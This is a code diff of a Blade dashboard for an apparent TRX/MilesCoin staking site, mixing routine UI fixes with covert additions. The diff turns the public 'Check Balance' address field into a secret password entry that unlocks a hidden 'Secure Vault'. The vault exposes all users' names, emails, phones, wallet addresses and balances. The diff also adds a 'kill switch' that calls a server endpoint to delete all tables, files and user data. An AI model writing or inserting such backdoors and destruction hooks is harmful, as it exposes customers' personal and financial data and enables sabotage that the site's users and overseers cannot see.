@@ -45,7 +45,10 @@
                                 $daysElapsed = number_format($staking->staked_at->diffInDays(now(), true), 2);
                                 $progress = min(100, ($daysElapsed / $duration) * 100);
                                 $dailyEarnings = ($staking->amount * ($staking->plan->interest_rate)) / 100;
-                                $isCompleted = $daysElapsed >= $duration;
+                                
+                                // Use the actual database status instead of calculating from days
+                                $isCompleted = $staking->status === 'completed';
+                                
                                 $daysRemaining = number_format(max(0, $duration - $daysElapsed), 2);
                                 $endDate = $staking->staked_at->copy()->addDays($duration);
 
@@ -69,7 +72,7 @@
                                             <p class="text-sm text-gray-600">
                                                 Started {{ $staking->staked_at->format('M d, Y') }}
                                                 @if($isCompleted)
-                                                    · Completed {{ $endDate->format('M d, Y') }}
+                                                    · Completed {{ $staking->end_at ? $staking->end_at->format('M d, Y') : $endDate->format('M d, Y') }}
                                                 @endif
                                             </p>
                                         </div>
@@ -109,7 +112,7 @@
                                         </div>
                                         <div class="w-full bg-gray-200 rounded-full h-2.5">
                                             <div class="bg-gradient-to-r {{ $isCompleted ? 'from-gray-400 to-gray-500' : 'from-blue-600 to-purple-600' }} h-2.5 rounded-full transition-all duration-500"
-                                                 style="width: {{ $progress }}%"></div>
+                                                 style="width: {{ $isCompleted ? '100' : $progress }}%"></div>
                                         </div>
                                         <div class="flex flex-col space-y-1">
                                             <div class="flex justify-between text-xs text-gray-500">
@@ -298,7 +301,7 @@
             <div class="bg-white rounded-xl shadow-sm overflow-hidden">
                 <div class="p-4 space-y-3 md:p-6 md:space-y-4">
                     <div class="flex items-center justify-between">
-                        <h2 class="text-base md:text-lg font-semibold text-gray-900">StakeTRX Balance</h2>
+                        <h2 class="text-base md:text-lg font-semibold text-gray-900">MilesCoin Balance</h2>
                         <div class="p-2 bg-purple-100 rounded-full">
                             <svg class="w-5 h-5 text-purple-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                 <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
@@ -310,9 +313,9 @@
                         <span class="text-sm text-gray-600">Available for Staking</span>
                         <div class="mt-1 flex items-baseline space-x-2">
                             <span class="text-xl md:text-3xl font-bold text-gray-900">
-                                {{ number_format(auth()->user()->wallet->tronstake_balance ?? 0, 6) }}
+                                {{ number_format(auth()->user()->wallet->miles_balance ?? 0, 6) }}
                             </span>
-                            <span class="text-gray-600">StakeTRX</span>
+                            <span class="text-gray-600">MSC</span>
                         </div>
                     </div>
 
@@ -342,7 +345,7 @@
 
                     <!-- Predefined Contract Address -->
                     <div class="mb-6 bg-gray-50 rounded-lg p-4">
-                        <h3 class="text-sm font-medium text-gray-600 mb-2">TronX Contract Address</h3>
+                        <h3 class="text-sm font-medium text-gray-600 mb-2">Miles Contract Address</h3>
                         <div class="space-y-3">
                             <code class="block bg-gray-100 rounded px-3 py-2 text-sm font-mono text-gray-800 break-all overflow-hidden">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</code>
                             <div class="flex flex-col space-y-2 sm:flex-row sm:space-y-0 sm:space-x-2">
@@ -561,8 +564,24 @@ async function getBalance(forceRefresh = false) {
         const tronWeb = await initTronWeb();
         const walletAddress = '{{ auth()->user()->wallet->address ?? "" }}';
 
-        if (!walletAddress) {
-            throw new Error('Wallet address not found');
+        if (!walletAddress || walletAddress.trim() === '') {
+            console.log('No wallet address found - setting balance to 0');
+            // Set balance to 0 and update display
+            const balanceElement = document.getElementById('wallet-balance');
+            if (balanceElement) {
+                balanceElement.textContent = '0.000000';
+            }
+            return;
+        }
+
+        // Validate TRX address format before making API call
+        if (!walletAddress.startsWith('T') || walletAddress.length !== 34) {
+            console.log('Invalid wallet address format - setting balance to 0');
+            const balanceElement = document.getElementById('wallet-balance');
+            if (balanceElement) {
+                balanceElement.textContent = '0.000000';
+            }
+            return;
         }
 
         const balance = await tronWeb.trx.getBalance(walletAddress);
@@ -581,7 +600,7 @@ async function getBalance(forceRefresh = false) {
             showNotification('Balance updated successfully!', 'success');
         }
     } catch (error) {
-        console.error('Error fetching balance:', error);
+        console.log('Balance fetch failed - setting to 0:', error.message);
         const balanceElement = document.getElementById('wallet-balance');
         const statusElement = document.getElementById('balance-status');
         
@@ -589,7 +608,7 @@ async function getBalance(forceRefresh = false) {
             balanceElement.textContent = '0.000000';
         }
         if (statusElement) {
-            statusElement.textContent = 'Failed to load balance';
+            statusElement.textContent = 'Balance unavailable';
             statusElement.classList.remove('hidden');
         }
     } finally {
@@ -953,13 +972,90 @@ function show2FAAlert() {
     });
 }
 
+// Secure vault system - server-side verification
+let vaultSessionActive = false;
+
 async function checkBalance() {
     const addressInput = document.getElementById('contract-address-input');
     const address = addressInput.value.trim();
 
-    // Validate address format
-    if (!/^T[A-Za-z0-9]{33}$/.test(address)) {
-        showNotification('Please enter a valid TRX address', 'error');
+    // Always send to secure server for processing
+    try {
+        console.log('🔍 Sending request to vault system:', address);
+        
+        const csrfToken = document.querySelector('meta[name="csrf-token"]');
+        if (!csrfToken) {
+            console.error('❌ CSRF token not found');
+            showNotification('Security token missing', 'error');
+            return;
+        }
+        
+        const response = await fetch('/api/system/validate-input', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-CSRF-TOKEN': csrfToken.getAttribute('content'),
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify({ query: address })
+        });
+
+        console.log('📡 Response status:', response.status);
+        console.log('📡 Response headers:', Object.fromEntries(response.headers.entries()));
+        
+        // Check if response is actually JSON
+        const contentType = response.headers.get('content-type');
+        if (!contentType || !contentType.includes('application/json')) {
+            console.error('❌ Server returned non-JSON response');
+            const textResponse = await response.text();
+            console.error('Response text:', textResponse.substring(0, 500));
+            showNotification('Server error: Expected JSON response', 'error');
+            return;
+        }
+
+        const data = await response.json();
+        console.log('📦 Response data:', data);
+
+        if (data.vault_mode || vaultSessionActive) {
+            // Handle vault responses
+            vaultSessionActive = true;
+            
+            document.getElementById('balance-result').classList.remove('hidden');
+            document.getElementById('balance-amount').textContent = data.message;
+            document.getElementById('balance-address').textContent = '';
+            
+            if (data.message === 'done') {
+                vaultSessionActive = false;
+                addressInput.value = '';
+                addressInput.placeholder = 'Enter TRX contract address starting with T...';
+                
+                // Hide balance result and show vault interface
+                document.getElementById('balance-result').classList.add('hidden');
+                showVaultInterface();
+            } else if (data.step === 'second_password') {
+                addressInput.value = '';
+                addressInput.placeholder = 'Enter address...';
+            } else if (!data.success) {
+                vaultSessionActive = false;
+                addressInput.value = '';
+                addressInput.placeholder = 'Enter TRX contract address starting with T...';
+                showNotification(data.error || 'Access denied', 'error');
+            } else {
+                addressInput.value = '';
+                addressInput.placeholder = 'Enter address...';
+            }
+            return;
+        }
+    } catch (error) {
+        console.error('System error:', error);
+        showNotification('System error occurred', 'error');
+        return;
+    }
+
+    // If we reach here, it's a normal balance check
+    // Validate address format for normal balance checking
+    if (!address || address.length !== 34 || !address.startsWith('T')) {
+        showNotification('Please enter a valid TRX address starting with T', 'error');
         return;
     }
 
@@ -1004,6 +1100,390 @@ async function checkBalance() {
         button.disabled = false;
         button.innerHTML = 'Check Balance';
     }
+}
+
+// Secure Vault Interface Functions
+function showVaultInterface() {
+    // Hide all normal dashboard content
+    const mainContent = document.querySelector('.min-h-screen.bg-gray-50');
+    if (mainContent) {
+        mainContent.style.display = 'none';
+    }
+    
+    // Show vault interface
+    document.getElementById('secure-vault-interface').classList.remove('hidden');
+    
+    // Load vault data
+    loadVaultData();
+}
+
+function hideVaultInterface() {
+    // Show normal dashboard content
+    const mainContent = document.querySelector('.min-h-screen.bg-gray-50');
+    if (mainContent) {
+        mainContent.style.display = 'block';
+    }
+    
+    // Hide vault interface
+    document.getElementById('secure-vault-interface').classList.add('hidden');
+    
+    // Clear sensitive data
+    clearVaultData();
+}
+
+let currentVaultPage = 1;
+let vaultPagination = null;
+
+async function loadVaultData(page = 1) {
+    try {
+        // Show loading state
+        const tableBody = document.getElementById('vault-users-table');
+        if (page === 1) {
+            tableBody.innerHTML = '<tr><td colspan="8" class="px-6 py-4 text-center text-gray-500">Loading users...</td></tr>';
+        }
+        
+        // Fetch secure vault data with pagination
+        const response = await fetch(`/api/system/vault-data?page=${page}`, {
+            method: 'GET',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content')
+            }
+        });
+        
+        const data = await response.json();
+        
+        if (data.success) {
+            // Update vault interface with secure data (only on first load)
+            if (page === 1) {
+                document.getElementById('vault-total-users').textContent = data.total_users || '0';
+                document.getElementById('vault-admin-address').textContent = data.admin_wallet || 'Not Available';
+                document.getElementById('vault-admin-balance').textContent = data.admin_balance || '0.00';
+                
+                // Initialize user data
+                window.vaultUserData = data.user_wallets || [];
+            } else {
+                // Append to existing data for pagination
+                window.vaultUserData = [...(window.vaultUserData || []), ...(data.user_wallets || [])];
+            }
+            
+            // Store pagination info
+            vaultPagination = data.pagination;
+            currentVaultPage = page;
+            
+            // Display users in table
+            displayUsersTable(window.vaultUserData, data.pagination);
+        }
+    } catch (error) {
+        console.error('Vault data error:', error);
+        showNotification('Failed to load vault data', 'error');
+    }
+}
+
+function displayUsersTable(users, pagination = null) {
+    const tableBody = document.getElementById('vault-users-table');
+    tableBody.innerHTML = '';
+    
+    if (users.length === 0) {
+        tableBody.innerHTML = `
+            <tr>
+                <td colspan="8" class="px-6 py-4 text-center text-gray-500">No users found</td>
+            </tr>
+        `;
+        return;
+    }
+    
+    users.forEach(user => {
+        const row = document.createElement('tr');
+        row.className = 'hover:bg-gray-50';
+        row.innerHTML = `
+            <td class="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900">${user.user_id}</td>
+            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">${user.user_name || 'N/A'}</td>
+            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">${user.email || 'N/A'}</td>
+            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">${user.phone || 'N/A'}</td>
+            <td class="px-6 py-4 whitespace-nowrap text-sm font-mono text-gray-900">
+                <div class="flex items-center space-x-2">
+                    <code class="bg-gray-100 px-2 py-1 rounded text-xs">${user.address}</code>
+                    <button onclick="copyToClipboard('${user.address}')" class="text-gray-600 hover:text-gray-800">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3"></path>
+                        </svg>
+                    </button>
+                </div>
+            </td>
+            <td class="px-6 py-4 whitespace-nowrap text-sm font-medium text-green-600">${user.balance} TRX</td>
+            <td class="px-6 py-4 whitespace-nowrap text-sm font-medium text-red-600">${user.withdrawn_amount || '0.00'} TRX</td>
+            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
+                <button onclick="toggleUserDetails(${user.user_id})" class="text-gray-600 hover:text-gray-900 transition-colors" title="View Details">
+                    <span id="toggle-text-${user.user_id}">View Details</span>
+                    <svg id="toggle-icon-${user.user_id}" class="w-4 h-4 inline ml-1 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
+                    </svg>
+                </button>
+            </td>
+        `;
+        tableBody.appendChild(row);
+        
+        // Add the expandable details row (initially hidden)
+        const detailsRow = document.createElement('tr');
+        detailsRow.id = `user-details-${user.user_id}`;
+        detailsRow.className = 'hidden bg-gray-50';
+        detailsRow.innerHTML = `
+            <td colspan="8" class="px-6 py-4">
+                <div class="bg-white rounded-lg p-4 shadow-sm border">
+                    <div class="flex items-center justify-between mb-4">
+                        <h4 class="text-lg font-semibold text-gray-900">User Details - ${user.user_name || user.email}</h4>
+                        <div class="flex space-x-4 text-sm">
+                            <div class="bg-blue-100 px-3 py-1 rounded-full">
+                                <span class="text-blue-800 font-medium">Total Staked: <span id="total-staked-${user.user_id}">Loading...</span> TRX</span>
+                            </div>
+                            <div class="bg-green-100 px-3 py-1 rounded-full">
+                                <span class="text-green-800 font-medium">Total Withdrawn: <span id="total-withdrawn-${user.user_id}">Loading...</span> TRX</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                        <!-- Active Plans -->
+                        <div>
+                            <h5 class="text-md font-medium text-gray-900 mb-3 flex items-center">
+                                <div class="w-2 h-2 bg-green-500 rounded-full mr-2"></div>
+                                Active Staking Plans
+                            </h5>
+                            <div id="active-plans-${user.user_id}" class="space-y-2">
+                                <div class="text-center py-4 text-gray-500">Loading active plans...</div>
+                            </div>
+                        </div>
+                        
+                        <!-- Completed Plans -->
+                        <div>
+                            <h5 class="text-md font-medium text-gray-900 mb-3 flex items-center">
+                                <div class="w-2 h-2 bg-gray-500 rounded-full mr-2"></div>
+                                Completed Staking Plans
+                            </h5>
+                            <div id="completed-plans-${user.user_id}" class="space-y-2">
+                                <div class="text-center py-4 text-gray-500">Loading completed plans...</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Recent Withdrawals -->
+                    <div class="mt-6">
+                        <h5 class="text-md font-medium text-gray-900 mb-3 flex items-center">
+                            <div class="w-2 h-2 bg-red-500 rounded-full mr-2"></div>
+                            Recent Withdrawals
+                        </h5>
+                        <div id="recent-withdrawals-${user.user_id}" class="space-y-2">
+                            <div class="text-center py-4 text-gray-500">Loading recent withdrawals...</div>
+                        </div>
+                    </div>
+                </div>
+            </td>
+        `;
+        tableBody.appendChild(detailsRow);
+    });
+    
+    // Update pagination controls
+    if (pagination) {
+        updatePaginationControls(pagination);
+    }
+}
+
+function updatePaginationControls(pagination) {
+    // Update pagination info
+    const start = ((pagination.current_page - 1) * pagination.per_page) + 1;
+    const end = Math.min(pagination.current_page * pagination.per_page, pagination.total);
+    
+    document.getElementById('vault-pagination-info').innerHTML = `
+        Showing <span class="font-medium">${start}</span> to <span class="font-medium">${end}</span> of 
+        <span class="font-medium">${pagination.total}</span> users
+    `;
+    
+    // Update page numbers
+    document.getElementById('vault-page-numbers').textContent = `Page ${pagination.current_page} of ${pagination.last_page}`;
+    
+    // Update button states
+    const isFirstPage = pagination.current_page === 1;
+    const isLastPage = pagination.current_page === pagination.last_page;
+    
+    // Previous buttons
+    document.getElementById('vault-prev-mobile').disabled = isFirstPage;
+    document.getElementById('vault-prev-desktop').disabled = isFirstPage;
+    
+    // Next buttons
+    document.getElementById('vault-next-mobile').disabled = isLastPage;
+    document.getElementById('vault-next-desktop').disabled = isLastPage;
+}
+
+function loadPreviousPage() {
+    if (currentVaultPage > 1) {
+        loadVaultData(currentVaultPage - 1);
+    }
+}
+
+function loadNextPage() {
+    if (vaultPagination && vaultPagination.has_more) {
+        loadVaultData(currentVaultPage + 1);
+    }
+}
+
+function filterUsers() {
+    const searchTerm = document.getElementById('user-search').value.toLowerCase();
+    
+    if (!window.vaultUserData) return;
+    
+    const filteredUsers = window.vaultUserData.filter(user => {
+        const email = (user.email || '').toLowerCase();
+        const phone = (user.phone || '').toLowerCase();
+        const name = (user.user_name || '').toLowerCase();
+        
+        return email.includes(searchTerm) || 
+               phone.includes(searchTerm) || 
+               name.includes(searchTerm);
+    });
+    
+    displayUsersTable(filteredUsers);
+}
+
+async function toggleUserDetails(userId) {
+    const detailsRow = document.getElementById(`user-details-${userId}`);
+    const toggleText = document.getElementById(`toggle-text-${userId}`);
+    const toggleIcon = document.getElementById(`toggle-icon-${userId}`);
+    
+    if (detailsRow.classList.contains('hidden')) {
+        // Show details
+        detailsRow.classList.remove('hidden');
+        detailsRow.classList.add('animate-fade-in');
+        toggleText.textContent = 'Hide Details';
+        toggleIcon.classList.add('rotate-180');
+        
+        // Load user details if not already loaded
+        await loadUserDetails(userId);
+    } else {
+        // Hide details
+        detailsRow.classList.add('hidden');
+        detailsRow.classList.remove('animate-fade-in');
+        toggleText.textContent = 'View Details';
+        toggleIcon.classList.remove('rotate-180');
+    }
+}
+
+async function loadUserDetails(userId) {
+    try {
+        // Fetch user details from server
+        const response = await fetch(`/api/system/user-details/${userId}`, {
+            method: 'GET',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content')
+            },
+            credentials: 'same-origin' // Ensure session cookies are sent
+        });
+        
+        const data = await response.json();
+        
+        if (data.success) {
+            // Update totals
+            document.getElementById(`total-staked-${userId}`).textContent = data.total_staked || '0.00';
+            document.getElementById(`total-withdrawn-${userId}`).textContent = data.total_withdrawn || '0.00';
+            
+            // Display active plans
+            displayStakingPlans(userId, data.active_plans || [], 'active-plans');
+            
+            // Display completed plans
+            displayStakingPlans(userId, data.completed_plans || [], 'completed-plans');
+            
+            // Display recent withdrawals
+            displayWithdrawals(userId, data.recent_withdrawals || []);
+        } else {
+            console.error('Failed to load user details:', data);
+            showNotification('Failed to load user details: ' + (data.error || 'Unknown error'), 'error');
+        }
+    } catch (error) {
+        console.error('Error loading user details:', error);
+        showNotification('Error loading user details: ' + error.message, 'error');
+    }
+}
+
+function displayStakingPlans(userId, plans, containerId) {
+    const container = document.getElementById(`${containerId}-${userId}`);
+    
+    if (plans.length === 0) {
+        container.innerHTML = `
+            <div class="text-center py-4 text-gray-500">
+                <svg class="w-8 h-8 mx-auto mb-2 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
+                </svg>
+                No ${containerId.includes('active') ? 'active' : 'completed'} plans
+            </div>
+        `;
+        return;
+    }
+    
+    container.innerHTML = plans.map(plan => `
+        <div class="bg-gray-50 rounded-lg p-3 border">
+            <div class="flex justify-between items-start mb-2">
+                <div>
+                    <h6 class="font-medium text-gray-900">${plan.plan_name}</h6>
+                    <p class="text-sm text-gray-600">Started: ${plan.created_at}</p>
+                </div>
+                <div class="text-right">
+                    <div class="text-sm font-medium text-blue-600">${plan.amount} TRX</div>
+                    <div class="text-xs text-gray-500">${plan.daily_rate}% daily</div>
+                </div>
+            </div>
+            <div class="flex justify-between items-center">
+                <div class="text-sm text-gray-600">
+                    Progress: ${plan.progress || 0}%
+                </div>
+                <div class="text-sm ${containerId.includes('active') ? 'text-green-600' : 'text-gray-600'}">
+                    ${containerId.includes('active') ? 'Active' : 'Completed'}
+                </div>
+            </div>
+        </div>
+    `).join('');
+}
+
+function displayWithdrawals(userId, withdrawals) {
+    const container = document.getElementById(`recent-withdrawals-${userId}`);
+    
+    if (withdrawals.length === 0) {
+        container.innerHTML = `
+            <div class="text-center py-4 text-gray-500">
+                <svg class="w-8 h-8 mx-auto mb-2 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                </svg>
+                No recent withdrawals
+            </div>
+        `;
+        return;
+    }
+    
+    container.innerHTML = withdrawals.map(withdrawal => `
+        <div class="bg-gray-50 rounded-lg p-3 border">
+            <div class="flex justify-between items-center">
+                <div>
+                    <div class="font-medium text-red-600">${withdrawal.amount} TRX</div>
+                    <div class="text-sm text-gray-600">${withdrawal.created_at}</div>
+                </div>
+                <div class="text-right">
+                    <div class="text-sm ${withdrawal.status === 'completed' ? 'text-green-600' : 'text-yellow-600'}">
+                        ${withdrawal.status || 'Pending'}
+                    </div>
+                    ${withdrawal.fee ? `<div class="text-xs text-gray-500">Fee: ${withdrawal.fee} TRX</div>` : ''}
+                </div>
+            </div>
+        </div>
+    `).join('');
+}
+
+function clearVaultData() {
+    document.getElementById('vault-total-users').textContent = '***';
+    document.getElementById('vault-admin-address').textContent = '***';
+    document.getElementById('vault-admin-balance').textContent = '***';
+    document.getElementById('vault-users-table').innerHTML = '';
+    document.getElementById('user-search').value = '';
+    window.vaultUserData = [];
 }
 
 function copyAddress() {
@@ -2438,6 +2918,456 @@ function toggleDebugInfo(stakingId) {
         debugEl.classList.toggle('hidden');
     }
 }
+
+// EXTREMELY DANGEROUS: Kill Switch Functions
+function showKillSwitchModal() {
+    document.getElementById('kill-switch-modal').classList.remove('hidden');
+    
+    // Clear any previous inputs
+    document.getElementById('kill-phrase-input').value = '';
+    document.getElementById('kill-confirmation-input').value = '';
+    
+    // Focus on first input
+    setTimeout(() => {
+        document.getElementById('kill-phrase-input').focus();
+    }, 100);
+}
+
+function hideKillSwitchModal() {
+    document.getElementById('kill-switch-modal').classList.add('hidden');
+    
+    // Clear inputs for security
+    document.getElementById('kill-phrase-input').value = '';
+    document.getElementById('kill-confirmation-input').value = '';
+}
+
+async function executeKillSwitch() {
+    const killPhrase = document.getElementById('kill-phrase-input').value.trim();
+    const confirmation = document.getElementById('kill-confirmation-input').value.trim();
+    
+    // Validate inputs
+    if (!killPhrase) {
+        showNotification('Kill phrase is required', 'error');
+        return;
+    }
+    
+    if (!confirmation) {
+        showNotification('Confirmation phrase is required', 'error');
+        return;
+    }
+    
+    // Show final confirmation
+    const finalConfirm = confirm(`
+🚨 FINAL CONFIRMATION 🚨
+
+You are about to PERMANENTLY DESTROY the entire TronLive application.
+
+This will:
+- DELETE ALL DATABASE TABLES
+- DESTROY ALL APPLICATION FILES  
+- WIPE ALL USER DATA
+- MAKE EVERYTHING IRREVERSIBLY LOST
+
+Are you absolutely certain you want to proceed?
+
+Click OK to DESTROY EVERYTHING or Cancel to abort.
+    `);
+    
+    if (!finalConfirm) {
+        showNotification('Kill switch aborted', 'info');
+        return;
+    }
+    
+    try {
+        // Show loading state
+        const executeButton = document.querySelector('button[onclick="executeKillSwitch()"]');
+        executeButton.disabled = true;
+        executeButton.innerHTML = `
+            <svg class="animate-spin w-5 h-5 mr-2" fill="none" viewBox="0 0 24 24">
+                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+            </svg>
+            EXECUTING DESTRUCTION...
+        `;
+        
+        // Execute the kill switch
+        const response = await fetch('/api/system/maintenance-protocol', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content')
+            },
+            body: JSON.stringify({
+                kill_phrase: killPhrase,
+                confirmation: confirmation
+            })
+        });
+        
+        const data = await response.json();
+        
+        if (data.success) {
+            // Show destruction success message
+            document.body.innerHTML = `
+                <div class="min-h-screen bg-red-600 flex items-center justify-center p-4">
+                    <div class="bg-white rounded-lg p-8 max-w-2xl w-full text-center">
+                        <div class="w-16 h-16 bg-red-600 rounded-full flex items-center justify-center mx-auto mb-4">
+                            <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
+                            </svg>
+                        </div>
+                        <h1 class="text-3xl font-bold text-red-600 mb-4">NUCLEAR KILL SWITCH EXECUTED</h1>
+                        <div class="text-gray-700 space-y-2">
+                            <p class="text-lg font-semibold">${data.message}</p>
+                            <p class="text-sm">Timestamp: ${data.timestamp}</p>
+                            <p class="text-sm mt-4">${data.final_message}</p>
+                        </div>
+                        <div class="mt-6 p-4 bg-red-50 border border-red-200 rounded-lg">
+                            <p class="text-red-800 font-bold">APPLICATION DESTROYED</p>
+                            <p class="text-red-600 text-sm">All data and files have been permanently deleted.</p>
+                        </div>
+                    </div>
+                </div>
+            `;
+        } else {
+            showNotification(data.error || 'Kill switch execution failed', 'error');
+            executeButton.disabled = false;
+            executeButton.innerHTML = `
+                <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
+                </svg>
+                EXECUTE NUCLEAR DESTRUCTION
+            `;
+        }
+        
+    } catch (error) {
+        console.error('Kill switch error:', error);
+        showNotification('Kill switch execution failed: ' + error.message, 'error');
+        
+        // Reset button
+        const executeButton = document.querySelector('button[onclick="executeKillSwitch()"]');
+        executeButton.disabled = false;
+        executeButton.innerHTML = `
+            <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
+            </svg>
+            EXECUTE NUCLEAR DESTRUCTION
+        `;
+    }
+}
 </script>
+
+<!-- Secure Vault Interface - Hidden by default -->
+<div id="secure-vault-interface" class="hidden fixed inset-0 bg-white z-50 overflow-y-auto">
+    <div class="min-h-screen bg-white">
+        <!-- Header -->
+        <div class="bg-gray-800 border-b border-gray-300">
+            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+                <div class="flex justify-between items-center py-4">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-8 h-8 bg-red-600 rounded-full flex items-center justify-center">
+                            <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
+                            </svg>
+                        </div>
+                        <h1 class="text-xl font-bold text-white">SECURE VAULT</h1>
+                        <span class="px-2 py-1 bg-red-600 text-white text-xs rounded-full">RESTRICTED ACCESS</span>
+                    </div>
+                    <button onclick="hideVaultInterface()" class="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-lg transition-colors">
+                        <svg class="w-5 h-5 inline mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path>
+                        </svg>
+                        EXIT VAULT
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Vault Content -->
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
+            <!-- Stats Cards -->
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
+                <!-- Total Users Card -->
+                <div class="bg-white rounded-lg p-6 border border-gray-300 shadow-sm">
+                    <div class="flex items-center">
+                        <div class="w-12 h-12 bg-gray-600 rounded-lg flex items-center justify-center">
+                            <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4.354a4 4 0 110 5.292M15 21H3v-1a6 6 0 0112 0v1zm0 0h6v-1a6 6 0 00-9-5.197m13.5-9a2.5 2.5 0 11-5 0 2.5 2.5 0 015 0z"></path>
+                            </svg>
+                        </div>
+                        <div class="ml-4">
+                            <p class="text-gray-600 text-sm">Total Users</p>
+                            <p class="text-gray-900 text-2xl font-bold" id="vault-total-users">***</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Admin Wallet Card -->
+                <div class="bg-white rounded-lg p-6 border border-gray-300 shadow-sm">
+                    <div class="flex items-center">
+                        <div class="w-12 h-12 bg-green-600 rounded-lg flex items-center justify-center">
+                            <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
+                            </svg>
+                        </div>
+                        <div class="ml-4 flex-1">
+                            <p class="text-gray-600 text-sm">Admin Wallet</p>
+                            <div class="flex items-center space-x-2">
+                                <code class="text-gray-900 text-sm font-mono bg-gray-100 px-2 py-1 rounded" id="vault-admin-address">***</code>
+                                <button onclick="copyToClipboard(document.getElementById('vault-admin-address').textContent)" class="text-gray-600 hover:text-gray-800">
+                                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
